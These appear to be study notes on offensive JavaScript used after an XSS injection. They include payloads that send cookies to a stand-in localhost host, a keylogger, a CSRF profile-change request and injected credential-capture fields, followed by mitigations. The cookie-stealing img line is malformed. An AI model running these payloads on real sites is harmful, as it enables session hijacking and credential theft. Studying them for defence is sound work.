**📌 Offensive JavaScript Notes**

---

### 🚀 High-Level Summary

Cross-Site Scripting (XSS) can be utilized for more than just triggering `alert(1)` pop-ups. Attackers can leverage XSS for malicious activities like stealing sensitive data, manipulating DOM elements, and exfiltrating information to external servers. This document explores various techniques including accessing local and session storage, stealing cookies, and making unauthorized HTTP requests.

---

### 📦 Accessing Local & Session Storage

```javascript
let localStorageData = JSON.stringify(localStorage);
let sessionStorageData = JSON.stringify(sessionStorage);
```

- **localStorage**: Persistent storage (remains after closing the browser).
    
- **sessionStorage**: Temporary storage (cleared when the tab is closed).
    

Attackers can access and exfiltrate sensitive data stored here.

---

### 🍪 Stealing Cookies

```javascript
<img src="http://localhost?c=" + document.cookie />

fetch("http://localhost?c=" + document.cookie);
```

- `**document.cookie**` exposes cookies stored in the browser.
    
- Cookies can be **exfiltrated** using an `img` tag or the **Fetch API**.
    

Stolen cookies can be used to hijack sessions or perform unauthorized actions.

---

### 📡 Building HTTP Requests

#### **XMLHttpRequest**

```javascript
let xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost/endpoint', true);
xhr.send('email=update@email.com');
```

#### **Fetch API** (Modern)

```javascript
fetch('http://localhost/endpoint');
```

- **Fetch API** is modern, promise-based, and cleaner than `XMLHttpRequest`.
    

Attackers can automate data exfiltration or perform unauthorized actions on a victim's behalf.

---

### 🛠️ Keylogging

```javascript
document.onkeypress = function(e) {
    let get = window.event ? event : e;
    let key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    console.log(key);
}
```

- **Keylogging** captures every keystroke made by the user and logs it to the console.
    
- Often used to steal sensitive input like passwords and usernames.
    

---

### 🎭 Session Riding (CSRF)

```javascript
let xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost/updateprofile', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send('email=updated@email.com');
```

- **Session Riding (CSRF)** tricks a logged-in user into performing unauthorized actions.
    
- Prevent by using CSRF tokens and proper session handling.
    

---

### 🔑 Saved Credentials Capture

```javascript
let usernameField = document.createElement('input');
usernameField.type = 'text';
usernameField.name = 'username';
usernameField.id = 'username';

document.body.appendChild(usernameField);

let passwordField = document.createElement('input');
passwordField.type = 'password';
passwordField.name = 'password';
passwordField.id = 'password';

document.body.appendChild(passwordField);

setTimeout(function() {
    console.log("Username:", document.getElementById("username").value);
    console.log("Password:", document.getElementById("password").value);
}, 1000);
```

- **Saved Credentials Capture** attempts to steal credentials by injecting fields and logging their input.
    

---

### 🚀 Fetch API Basics

#### ✅ Basic Usage:

```javascript
async function fetchData() {
    const response = await fetch('https://example.com/data');
    const jsonData = await response.json();
    console.log(jsonData);
}
```

- `**await fetch()**` makes an HTTP request.
    
- `**.json()**` parses response into JSON.
    

#### ✅ POST Example:

```javascript
fetch('https://example.com/post', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'John' })
});
```

Attackers can use `fetch()` for data exfiltration and making unauthorized API calls.

---

### 🛡️ Security Risks

- **XSS (Cross-Site Scripting)**: Using JS to steal sensitive data.
    
- **Keylogging:** Logging user keystrokes.
    
- **Session Riding (CSRF):** Tricking users into making unintended requests.
    
- **Saved Credentials Capture:** Injecting input fields to steal data.
    

**Mitigation:** Use `**HttpOnly**`, **CSP**, CSRF Tokens, and proper input validation.

---

🔗 **Always test responsibly in authorized environments!**